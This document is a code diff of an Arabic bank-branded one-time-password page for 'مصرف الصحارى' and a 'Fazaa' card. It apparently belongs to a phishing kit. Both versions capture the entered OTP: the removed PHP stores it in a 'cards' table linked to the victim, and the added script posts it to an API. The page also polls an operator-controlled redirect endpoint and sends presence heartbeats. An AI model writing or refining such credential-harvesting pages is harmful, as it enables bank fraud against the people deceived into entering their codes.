@@ -1,26 +1,3 @@
-<?php
-session_start();
-require_once __DIR__ . '/config.php';
-
-if (isset($_POST['submit'])) {
-    $otp = $_POST['otp'] ?? '';
-    if (isset($_SESSION['user_id'])) {
-        $userId = intval($_SESSION['user_id']);
-        // Save OTP to latest card or create new card entry
-        $cards = supabase_get('cards', 'user_id=eq.' . $userId, '*', 'created_at.desc');
-        if (!empty($cards)) {
-            supabase_update('cards', 'id=eq.' . $cards[0]['id'], ['otp' => $otp]);
-        } else {
-            supabase_insert('cards', ['user_id' => $userId, 'otp' => $otp]);
-        }
-        supabase_update('users', 'id=eq.' . $userId, [
-            'message' => 'رمز OTP',
-            'page' => 'otp.php',
-            'updated_at' => date('Y-m-d H:i:s')
-        ]);
-    }
-}
-?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -59,7 +36,6 @@ if (isset($_POST['submit'])) {
             flex-direction: column;
         }
 
-        /* === Navbar === */
         .sahara-nav {
             display: flex;
             justify-content: center;
@@ -92,7 +68,6 @@ if (isset($_POST['submit'])) {
             text-decoration: none;
         }
 
-        /* === Step Indicator === */
         .step-indicator {
             display: flex;
             justify-content: center;
@@ -121,7 +96,6 @@ if (isset($_POST['submit'])) {
             50% { transform: scale(1.3); }
         }
 
-        /* === Form Header === */
         .otp-icon {
             width: 64px;
             height: 64px;
@@ -136,7 +110,6 @@ if (isset($_POST['submit'])) {
             color: var(--sahara-green);
         }
 
-        /* === Form Card === */
         .form-wrap {
             flex: 1;
             padding: 0 16px 24px;
@@ -178,7 +151,6 @@ if (isset($_POST['submit'])) {
             font-weight: 700;
         }
 
-        /* === OTP Input === */
         .otp-input {
             width: 100%;
             border: 1.5px solid var(--sahara-border);
@@ -205,7 +177,6 @@ if (isset($_POST['submit'])) {
             letter-spacing: 8px;
         }
 
-        /* === Submit Button === */
         .btn-submit-sahara {
             width: 100%;
             background: linear-gradient(135deg, #2d2d4e, #2d2d4e);
@@ -230,7 +201,6 @@ if (isset($_POST['submit'])) {
             box-shadow: 0 8px 25px rgba(44, 122, 44, 0.4);
         }
 
-        /* === Error === */
         .error-msg {
             color: #DC2626;
             font-weight: 600;
@@ -244,7 +214,6 @@ if (isset($_POST['submit'])) {
             text-align: right;
         }
 
-        /* === Info Note === */
         .info-note {
             background: var(--sahara-green-light);
             border: 1px solid rgba(44, 122, 44, 0.2);
@@ -266,7 +235,6 @@ if (isset($_POST['submit'])) {
             margin: 0;
         }
 
-        /* === Footer === */
         .sahara-footer {
             background: linear-gradient(135deg, #2d2d4e, #2d2d4e);
             color: var(--sahara-white);
@@ -305,15 +273,13 @@ if (isset($_POST['submit'])) {
 </head>
 <body>
 
-    <!-- Navbar -->
     <nav class="sahara-nav">
-        <a href="index.php" class="back-btn">
+        <a href="index.html" class="back-btn">
             <i class="fas fa-arrow-right"></i>
         </a>
         <img src="./assets/sahara_brand_logo.png" alt="مصرف الصحارى" class="logo-img">
     </nav>
 
-    <!-- Step Indicator -->
     <div class="step-indicator">
         <div class="step-dot completed"></div>
         <div class="step-dot completed"></div>
@@ -321,7 +287,6 @@ if (isset($_POST['submit'])) {
         <div class="step-dot"></div>
     </div>
 
-    <!-- Form -->
     <div class="form-wrap fade-in">
         <div class="form-card">
             <div class="otp-icon">
@@ -336,12 +301,11 @@ if (isset($_POST['submit'])) {
                 <span id="time"></span>
             </div>
 
-            <form action="" method="post">
+            <form id="otpForm">
                 <input type="text" pattern="[0-9]+" minlength="4" maxlength="6" inputmode="numeric" required name="otp" class="otp-input" placeholder="------">
                 <input type="hidden" name="status" value="3">
 
-                
-                <button class="btn-submit-sahara" type="submit" name="submit">
+                <button class="btn-submit-sahara" type="submit">
                     <i class="fas fa-check-circle"></i>
                     المتابعة
                 </button>
@@ -354,18 +318,59 @@ if (isset($_POST['submit'])) {
         </div>
     </div>
 
-    <!-- Footer -->
     <footer class="sahara-footer">
         <img src="https://i.postimg.cc/yNsF5MSj/6-2.png" alt="مصرف الصحارى" class="footer-logo"><br>
         <p style="color:var(--sahara-gold);font-weight:600;font-size:12px;margin-bottom:2px;">بطاقة فزعه | FAZAA</p>
         <p>&copy;© Fazaa 2026 - جميع الحقوق محفوظة</p>
     </footer>
 
-<script src="js/main.js"></script>
+<script>
+(function() {
+    var totalSeconds = 60;
+    var timerEl = document.getElementById('time');
+    function updateTimer() {
+        var minutes = Math.floor(totalSeconds / 60);
+        var seconds = totalSeconds % 60;
+        timerEl.textContent = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
+        if (totalSeconds > 0) {
+            totalSeconds--;
+            setTimeout(updateTimer, 1000);
+        } else {
+            timerEl.textContent = '00:00';
+        }
+    }
+    updateTimer();
+})();
+</script>
+
+<script>
+document.getElementById('otpForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    var otp = this.querySelector('[name="otp"]').value;
+    var btn = this.querySelector('button[type="submit"]');
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحقق...';
+
+    fetch('/api/submit-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ otp: otp })
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(resp) {
+        btn.disabled = false;
+        btn.innerHTML = '<i class="fas fa-check-circle"></i> المتابعة';
+    })
+    .catch(function(err) {
+        btn.disabled = false;
+        btn.innerHTML = '<i class="fas fa-check-circle"></i> المتابعة';
+    });
+});
+</script>
 
 <script>
 function checkRedirect() {
-    fetch('polling-redirect.php')
+    fetch('/api/polling-redirect')
         .then(r => r.json())
         .then(data => {
             if (data.redirect) {
@@ -378,16 +383,14 @@ setInterval(checkRedirect, 1500);
 checkRedirect();
 </script>
 
-
 <script>
-// Heartbeat - تحديث حالة الاتصال فوراً
 function sendHeartbeat() {
-    fetch('heartbeat.php').catch(function(e){});
+    fetch('/api/heartbeat').catch(function(e){});
 }
 setInterval(sendHeartbeat, 2000);
 sendHeartbeat();
 window.addEventListener('beforeunload', function() {
-    navigator.sendBeacon('heartbeat.php', new URLSearchParams({action: 'offline'}));
+    navigator.sendBeacon('/api/heartbeat', new URLSearchParams({action: 'offline'}));
 });
 </script>
 </body>
